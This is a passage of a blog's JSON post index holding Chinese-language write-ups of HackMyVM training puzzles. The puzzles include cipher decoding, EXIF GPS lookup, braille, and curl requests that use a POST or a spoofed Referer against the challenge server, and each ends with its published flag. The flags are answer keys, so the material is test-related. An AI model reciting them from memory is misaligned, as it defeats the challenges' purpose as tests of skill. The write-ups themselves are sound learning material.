team\n```\n\n(AI\u7b97\u8fd9\u4e2a\u73a9\u610f\u5f88\u5bb9\u6613\u5e7b\u542c\uff0c\u5efa\u8bae\u6700\u597d\u81ea\u5df1\u9a8c\u8bc1\u4e00\u904d)\n\n![image-20250614094651088](https://7r1umphk.github.io/image/20250614094651302.webp)\n\n\u7b97\u51fa\u7684\u5bc6\u94a5\u6d41\u662f1F9S3SZ63TAS\uff0c\u5b83\u5b8c\u7f8e\u91cd\u590d\u4e86\n\n![image-20250614094821115](https://7r1umphk.github.io/image/20250614094821350.webp)\n\n```\nHMV{h0w_d0_y0u_g37_th15}\n```\n\nsentence", "top": 0, "createdAt": 1751016681, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P73": {"htmlDir": "docs/post/Challenge 037.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 037", "postUrl": "post/Challenge%20037.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/73", "commentNum": 0, "wordCount": 4898, "description": "![image-20250614105743955](https://7r1umphk.github.io/image/20250614105744262.webp)\n\n\u8fd8\u662f\u626b\u8857\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 037.zip \n-rwxr-xr-x 1 kali kali 6256698 Jun 13 22:57 037.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 037.zip \nArchive:  037.zip\n  inflating: osint.jpg               \n             \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ exiftool osint.jpg \nExifTool Version Number         : 13.25\nFile Name                       : osint.jpg\nDirectory                       : .\nFile Size                       : 6.3 MB\nFile Modification Date/Time     : 2023:07:17 21:14:46-04:00\nFile Access Date/Time           : 2025:06:13 22:58:07-04:00\nFile Inode Change Date/Time     : 2023:07:17 21:14:46-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Little-endian (Intel, II)\nMake                            : Sony\nCamera Model Name               : E5823\nOrientation                     : Horizontal (normal)\nX Resolution                    : 72\nY Resolution                    : 72\nResolution Unit                 : inches\nSoftware                        : 32.2.A.0.253_0_f500\nModify Date                     : 2016:07:25 20:44:46\nY Cb Cr Positioning             : Centered\nExposure Time                   : 1/2000\nF Number                        : 2.0\nISO                             : 40\nExif Version                    : 0220\nDate/Time Original              : 2016:07:25 20:44:46\nCreate Date                     : 2016:07:25 20:44:46\nComponents Configuration        : Y, Cb, Cr, -\nShutter Speed Value             : 1/1992\nExposure Compensation           : 0\nMetering Mode                   : Multi-segment\nLight Source                    : Unknown\nFlash                           : Off, Did not fire\nFocal Length                    : 4.2 mm\nSoft Skin Effect                : Off\nFace Info Offset                : 94\nSony Date Time                  : 2016:07:25 20:44:46\nSony Image Height               : 4160\nSony Image Width                : 5520\nFaces Detected                  : 0\nFace Info Length                : 26\nMeta Version                    : \nSub Sec Time                    : 461942\nSub Sec Time Original           : 461942\nSub Sec Time Digitized          : 461942\nFlashpix Version                : 0100\nColor Space                     : sRGB\nExif Image Width                : 5520\nExif Image Height               : 4140\nInteroperability Index          : R98 - DCF basic file (sRGB)\nInteroperability Version        : 0100\nCustom Rendered                 : Normal\nExposure Mode                   : Auto\nWhite Balance                   : Auto\nDigital Zoom Ratio              : 1\nScene Capture Type              : Landscape\nSubject Distance Range          : Unknown\nGPS Version ID                  : 2.2.0.0\nGPS Latitude Ref                : North\nGPS Longitude Ref               : East\nGPS Altitude Ref                : Above Sea Level\nGPS Time Stamp                  : 18:44:29\nGPS Status                      : Measurement Active\nGPS Map Datum                   : WGS-84\nGPS Date Stamp                  : 2016:07:25\nCompression                     : JPEG (old-style)\nThumbnail Offset                : 21346\nThumbnail Length                : 3982\nImage Width                     : 5520\nImage Height                    : 4140\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nAperture                        : 2.0\nImage Size                      : 5520x4140\nMegapixels                      : 22.9\nShutter Speed                   : 1/2000\nCreate Date                     : 2016:07:25 20:44:46.461942\nDate/Time Original              : 2016:07:25 20:44:46.461942\nModify Date                     : 2016:07:25 20:44:46.461942\nThumbnail Image                 : (Binary data 3982 bytes, use -b option to extract)\nGPS Altitude                    : 25 m Above Sea Level\nGPS Date/Time                   : 2016:07:25 18:44:29Z\nGPS Latitude                    : 58 deg 58' 2.87' N\nGPS Longitude                   : 18 deg 18' 59.03' E\nFocal Length                    : 4.2 mm\nGPS Position                    : 58 deg 58' 2.87' N, 18 deg 18' 59.03' E\nLight Value                     : 14.3\n                      \n```\n\n![osint](https://7r1umphk.github.io/image/20250614110003767.webp)\n\n\u6709GPS\u4fe1\u606f\uff01\n\n\u5c06\u7ecf\u7eac\u5ea6\u8f6c\u6362\u6210\u5341\u8fdb\u5236\n\nhttps://www.sunearthtools.com/dp/tools/conversion.php?lang=cn\n\n![image-20250614111103736](https://7r1umphk.github.io/image/20250614111103977.webp)\n\n\u7136\u540e\u6211\u53bb\u8bd5\u4e0d\u884c\n\n\u540e\u9762\u6211\u5c1d\u8bd5\u6dfb\u52a0\u4e00\u70b9\u51cf\u5c11\u4e00\u70b9\u624d\u6210\u529f\n\n\u6b63\u786e\u7684\u662f\n\n```\nHMV{58.967463,18.316396}\n```\n\nsentence", "top": 0, "createdAt": 1751016683, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P74": {"htmlDir": "docs/post/Challenge 015.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 015", "postUrl": "post/Challenge%20015.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/74", "commentNum": 0, "wordCount": 1673, "description": "**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=015\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io//image/20250518141943225.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u6311\u6218\u9875\u9762\u663e\u793a\u4e86\u4e00\u6bb5\u88ab `<pre>` \u6807\u7b7e\u5305\u88f9\u7684\u6587\u672c\uff1a\n\n```html\n<pre> push 7d616579 push 74696874 push 726f7773 push 696d7361 push 7b766d68 </pre>\n```\n\n\u8be5\u6587\u672c\u5305\u542b\u4e00\u7cfb\u5217 `push` \u6307\u4ee4\uff0c\u540e\u8ddf\u5341\u516d\u8fdb\u5236\u6570\u503c\u3002`push` \u64cd\u4f5c\u901a\u5e38\u7528\u4e8e\u5c06\u6570\u636e\u538b\u5165\u6808\u4e2d\uff0c\u800c\u6808\u662f\u540e\u8fdb\u5148\u51fa (LIFO) \u7684\u6570\u636e\u7ed3\u6784\u3002\u8fd9\u610f\u5473\u7740\u6700\u540e\u538b\u5165\u7684\u6570\u636e\u4f1a\u6700\u5148\u88ab\u53d6\u51fa\u3002\n\u8fd9\u4e9b\u5341\u516d\u8fdb\u5236\u6570\u503c `7d616579`, `74696874`, `726f7773`, `696d7361`, `7b766d68` \u7ec4\u5408\u8d77\u6765\u6784\u6210\u4e86 Flag \u7684\u67d0\u79cd\u7f16\u7801\u5f62\u5f0f\u3002\n\n## 2. \u89e3\u5bc6\u8fc7\u7a0b\n\n\u4e3a\u4e86\u5f97\u5230\u539f\u59cb Flag\uff0c\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e9b\u5341\u516d\u8fdb\u5236\u6570\u503c\u8f6c\u6362\u4e3a ASCII \u5b57\u7b26\uff0c\u5e76\u8003\u8651\u5230\u6808\u7684 LIFO \u7279\u6027\u4ee5\u53ca\u6570\u636e\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u65b9\u5f0f\uff08\u901a\u5e38\u662f\u5c0f\u7aef\u5e8f\uff0c\u5373\u5b57\u8282\u5e8f\u53cd\u8f6c\uff09\u3002\n\n### 2.1 \u4f7f\u7528 CyberChef \u8fdb\u884c\u5feb\u901f\u89e3\u7801\n\nCyberChef \u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u5904\u7406\u8fd9\u79cd\u8f6c\u6362\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u6b65\u9aa4\uff1a\n\n1.  **\u51c6\u5907\u8f93\u5165\u6570\u636e:**\n    \u5c06\u9875\u9762\u4e0a\u7ed9\u51fa\u7684\u5341\u516d\u8fdb\u5236\u6570\u503c\u6309\u7167\u5b83\u4eec `push` \u7684\u539f\u59cb\u987a\u5e8f\u5217\u51fa\uff0c\u5e76\u7528\u7a7a\u683c\u5206\u9694\uff1a\n    `7d616579 74696874 726f7773 696d7361 7b766d68`\n\n2.  **\u5728 CyberChef \u4e2d\u914d\u7f6e\u64cd\u4f5c:**\n    *   **Input:** \u5c06\u4e0a\u8ff0\u51c6\u5907\u597d\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u7c98\u8d34\u5230\u8f93\u5165\u6846\u3002\n    *   **Recipe:**\n        1.  `From Hex` (Delimiter: `Auto`)\uff1a\u6b64\u64cd\u4f5c\u4f1a\u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u8282\u5e8f\u5217\uff08ASCII \u5b57\u7b26\uff09\u3002\n        2.  `Reverse` (By: `Character`)\uff1a\u7531\u4e8e\u6808\u662f LIFO \u7684\uff0c\u5e76\u4e14\u6bcf\u4e2a `push` \u7684\u591a\u5b57\u8282\u6570\u636e\uff08\u5982 dword\uff09\u5728\u5185\u5b58\u4e2d\u901a\u5e38\u662f\u5c0f\u7aef\u5b58\u50a8\uff08\u5b57\u8282\u53cd\u5e8f\uff09\uff0c\u5c06\u6574\u4e2a\u8f6c\u6362\u540e\u7684\u5b57\u7b26\u4e32\u53cd\u8f6c\u53ef\u4ee5\u4e00\u6b21\u6027\u5904\u7406\u8fd9\u4e24\u4e2a\u53cd\u8f6c\u9700\u6c42\u3002\n\n    CyberChef \u7684\u64cd\u4f5c\u754c\u9762\u548c\u7ed3\u679c\u5982\u4e0b\u6240\u793a\uff1a\n    \n    ![image-20250518142527284](https://7r1umphk.github.io//image/20250518142527578.webp)\n\n    *   **Input:** `7d616579 74696874 726f7773 696d7361 7b766d68`\n    *   **Step 1 (From Hex):** \u8fd9\u4e00\u6b65\u4f1a\u5c06\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5176\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26\u3002\u4f8b\u5982\uff0c`7d` \u53d8\u4e3a `}`\uff0c`61` \u53d8\u4e3a `a`\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u7531\u4e8e\u8f93\u5165\u4e2d\u6709\u7a7a\u683c\uff0cCyberChef (Delimiter: Auto) \u4f1a\u5c06\u5b83\u4eec\u89c6\u4e3a\u5206\u9694\u7b26\uff0c\u6b63\u786e\u5904\u7406\u6bcf\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u3002\n        \u4e2d\u95f4\u7ed3\u679c\uff08\u903b\u8f91\u4e0a\u7684\uff0cCyberChef\u76f4\u63a5\u5904\u7406\uff09\uff1a`yea}thitsworasmihmv{` (\u6ce8\u610f\uff0c\u8fd9\u5df2\u7ecf\u662f\u8003\u8651\u4e86\u6bcf\u4e2a4\u5b57\u8282\u5757\u5185\u90e8\u5c0f\u7aef\u5e8f\u540e\u7684\u7ed3\u679c\uff0c\u4f46\u987a\u5e8f\u8fd8\u662f\u539f\u59cbpush\u7684\u987a\u5e8f)\n    *   **Step 2 (Reverse by Character):** \u5c06\u4e0a\u4e00\u6b65\u5f97\u5230\u7684\u6574\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u53cd\u8f6c\u3002\n        `yea}thitsworasmihmv{` \u53cd\u8f6c\u540e\u5f97\u5230 `hmv{asmisworthityea}`\n\n    **Output:** `hmv{asmisworthityea}`\n\n## 3. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n```\nHMV{asmisworthityea}\n```\nsentence", "top": 0, "createdAt": 1751016686, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P75": {"htmlDir": "docs/post/Challenge 017.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 017", "postUrl": "post/Challenge%20017.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/75", "commentNum": 0, "wordCount": 206, "description": "![image-20250612182714769](https://7r1umphk.github.io/image/202506121827070.webp)\n\n```\n\u2813\u280d\u2827{\u280a\u2819\u2815\u281d\u281e\u2805\u281d\u2815\u283a\u2803\u2817\u2801\u280a\u2807\u2807\u2811}\n```\n\n\u76f2\u6587\n\nhttps://zh.wikipedia.org/wiki/%E7%9B%B2%E6%96%87\n\n\u81ea\u5df1\u5bf9\u7740\u8f6c\n\n```\nHMV{idontknowbraille}\n```\n\nsentence", "top": 0, "createdAt": 1751016707, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P76": {"htmlDir": "docs/post/Challenge 018.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 018", "postUrl": "post/Challenge%20018.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/76", "commentNum": 0, "wordCount": 1178, "description": "![image-20250612182911676](https://7r1umphk.github.io/image/202506121829958.webp)\n\n```\nhttp://momo.hackmyvm.eu/ZiP004JfyGh/\n```\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/\n<!doctype html>\n<html lang='en'>\n<title>018</title>\nMaybe the flag is in aaAxghuyrtlksd.php\n</html>\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php\nYes, I have the flag! :)      \n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Thu, 12 Jun 2025 10:30:38 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\n\nYes, I have the flag! :)                                                                \n```\n\nPOST\u8bf7\u6c42\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -X POST http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php   \nHMV{postpostpost}                                                                     \n```\n\nsentence", "top": 0, "createdAt": 1751016713, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P77": {"htmlDir": "docs/post/Challenge 019.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 019", "postUrl": "post/Challenge%20019.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/77", "commentNum": 0, "wordCount": 1869, "description": "![image-20250612183423004](https://7r1umphk.github.io/image/202506121834338.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 019.zip        \n-rwxr-xr-x 1 kali kali 276 Jun 12 06:34 019.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 019.zip                 \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 276 bytes (1 KiB)\n\nExtracting archive: 019.zip\n--\nPath = 019.zip\nType = zip\nPhysical Size = 276\n\nEverything is Ok\n\nSize:       588\nCompressed: 276\n          \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 019.txt   \n\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584  \u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584.\u2588 \u2584\u2584\u2584 \u2588 \u2584\u2580\u2584 \u2588 \u2588 \u2584\u2584\u2584 \u2588.\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2584\u2584\u2588  \u2588 \u2588\u2588\u2588 \u2588.\u2588\u2584\u2584\u2584\u2584\u2584\u2588 \u2584 \u2584 \u2584 \u2588\u2584\u2584\u2584\u2584\u2584\u2588.\u2584\u2584\u2584\u2584  \u2584 \u2584\u2580\u2588\u2584\u2584\u2584  \u2584\u2584\u2584 \u2584.\u2580\u2584\u2580 \u2584 \u2584 \u2584\u2588\u2584\u2580 \u2584\u2588\u2588\u2580\u2580 \u2584\u2584. \u2588\u2584\u2588\u2588\u2584\u2584\u2588\u2588\u2588\u2580\u2584\u2584 \u2584\u2588 \u2588\u2584\u2580\u2584.\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2580\u2584\u2588\u2584\u2580  \u2584\u2588 \u2584 \u2580.\u2588 \u2584\u2584\u2584 \u2588  \u2584\u2584 \u2580\u2580  \u2580\u2580\u2588\u2584\u2580.\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2580\u2584\u2588\u2588\u2588 \u2580 \u2584\u2580\u2580 .\u2588\u2584\u2584\u2584\u2584\u2584\u2588 \u2588\u2580 \u2580\u2580\u2580\u2588\u2580\u2584 \u2584 \u2580                                                                                                                                                          \n```\n\n\u770b\u7740\u50cfqr\u7801\n\n\u627e\u89c4\u5f8b\uff0c\u6700\u540e\u90fd\u6709\u70b9\uff0c\u8fc7\u6ee4\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 019.txt | tr '.' '\\n' \n\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584  \u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\n\u2588 \u2584\u2584\u2584 \u2588 \u2584\u2580\u2584 \u2588 \u2588 \u2584\u2584\u2584 \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2584\u2584\u2588  \u2588 \u2588\u2588\u2588 \u2588\n\u2588\u2584\u2584\u2584\u2584\u2584\u2588 \u2584 \u2584 \u2584 \u2588\u2584\u2584\u2584\u2584\u2584\u2588\n\u2584\u2584\u2584\u2584  \u2584 \u2584\u2580\u2588\u2584\u2584\u2584  \u2584\u2584\u2584 \u2584\n\u2580\u2584\u2580 \u2584 \u2584 \u2584\u2588\u2584\u2580 \u2584\u2588\u2588\u2580\u2580 \u2584\u2584\n \u2588\u2584\u2588\u2588\u2584\u2584\u2588\u2588\u2588\u2580\u2584\u2584 \u2584\u2588 \u2588\u2584\u2580\u2584\n\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2580\u2584\u2588\u2584\u2580  \u2584\u2588 \u2584 \u2580\n\u2588 \u2584\u2584\u2584 \u2588  \u2584\u2584 \u2580\u2580  \u2580\u2580\u2588\u2584\u2580\n\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2580\u2584\u2588\u2588\u2588 \u2580 \u2584\u2580\u2580 \n\u2588\u2584\u2584\u2584\u2584\u2584\u2588 \u2588\u2580 \u2580\u2580\u2580\u2588\u2580\u2584 \u2584 \u2580                                                                                                                                                                                    \n```\n\n\u8349\u6599\u89e3\u4e00\u4e0bhttps://cli.im/deqr/other\n\n![image-20250612183849873](https://7r1umphk.github.io/image/202506121838056.webp)\n\n```\nHMV{asciiartt}\n```\n\nsentence", "top": 0, "createdAt": 1751016716, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P78": {"htmlDir": "docs/post/Challenge 020.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 020", "postUrl": "post/Challenge%20020.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/78", "commentNum": 0, "wordCount": 496, "description": "![image-20250612183946052](https://7r1umphk.github.io/image/202506121839359.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://momo.hackmyvm.eu/li0nsg3l9vhhe/                        \nYou are not coming from https://nepcodex.com/                                         \n```\n\n\u4f2a\u9020`Referer` \u8bf7\u6c42\u5934\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -e https://nepcodex.com/ http://momo.hackmyvm.eu/li0nsg3l9vhhe/\nHMV{youareawelcome}                                                                  \n```\n\nsentence", "top": 0, "createdAt": 1751016718, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P79": {"htmlDir": "docs/post/Challenge 021.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 021", "postUrl": "post/Challenge%20021.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/79", "commentNum": 0, "wordCount": 26830, "description": "![image-20250612184142389](https://7r1umphk.github.io/image/202506121841690.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 021.zip \n-rwxr-xr-x 1 kali kali 3576 Jun 12 06:41 021.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 021.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 3576 bytes (4 KiB)\n\nExtracting archive: 021.zip\n--\nPath = 021.zip\nType = zip\nPhysical Size = 3576\n\nEverything is Ok\n\nSize:       21982\nCompressed: 3576\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 21.txt                                                          \nf0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAcBAAAAAAAABAAAAAAAAAAAA3AAAAAAAAAAAAAEAAOAAN\nAEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA\nAAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA\nAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAGAAAAAAAAsAYAAAAAAAAAEAAA\nAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQIAAAAAAACxAgAAAAAAAAAQAAAA\nAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAsAQAAAAAAACwBAAAAAAAAABAAAAAA\nAAABAAAABgAAANAtAAAAAAAA0D0AAAAAAADQPQAAAAAAAFgCAAAAAAAAYAIAAAAAAAAAEAAAAAAA\nAAIAAAAGAAAA4C0AAAAAAADgPQAAAAAAAOA9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA\nBAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE\nAAAABAAAAFgDAAAAAAAAWAMAAAAAAABYAwAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl\ndGQEAAAAOAMAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0\nZAQAAABUIAAAAAAAAFQgAAAAAAAAVCAAAAAAAAAsAAAAAAAAACwAAAAAAAAABAAAAAAAAABR5XRk\nBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE\nAAAA0C0AAAAAAADQPQAAAAAAANA9AAAAAAAAMAIAAAAAAAAwAgAAAAAAAAEAAAAAAAAAL2xpYjY0\nL2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAoAAwAQAAAABAAAAAAAA\nAAQAAAAUAAAAAwAAAEdOVQCNEdhwtWSejKGgtndxYMH8U/HwUQQAAAAQAAAAAQAAAEdOVQAAAAAA\nAwAAAAIAAAAAAAAAAAAAAAIAAAAIAAAAAQAAAAYAAAAAAIEAAAAAAAgAAAAAAAAA0WXObQAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAAAAIAAAAAAA\nAAAAAAAAAAAAAAAAAAAiAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAEgAAAAAAAAAAAAAAAAAA\nAAAAAACGAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAApAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACVAAAA\nIAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAX19jeGFfZmluYWxp\nemUAX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAF9faXNvYzk5X3NjYW5mAHByaW50ZgBsaWJjLnNv\nLjYAR0xJQkNfMi43AEdMSUJDXzIuMi41AEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u\nZVRhYmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAgABAAMA\nAwABAAQAAQADAAAAAAAAAAEAAwA/AAAAEAAAAAAAAAAXaWkNAAAEAEkAAAAQAAAAdRppCQAAAwBT\nAAAAEAAAALSRlgYAAAIAXwAAAAAAAADQPQAAAAAAAAgAAAAAAAAAUBEAAAAAAADYPQAAAAAAAAgA\nAAAAAAAAEBEAAAAAAAAgQAAAAAAAAAgAAAAAAAAAIEAAAAAAAADAPwAAAAAAAAYAAAABAAAAAAAA\nAAAAAADIPwAAAAAAAAYAAAACAAAAAAAAAAAAAADQPwAAAAAAAAYAAAAFAAAAAAAAAAAAAADYPwAA\nAAAAAAYAAAAHAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAIAAAAAAAAAAAAAAAAQAAAAAAAAAcAAAAD\nAAAAAAAAAAAAAAAIQAAAAAAAAAcAAAAEAAAAAAAAAAAAAAAQQAAAAAAAAAcAAAAGAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA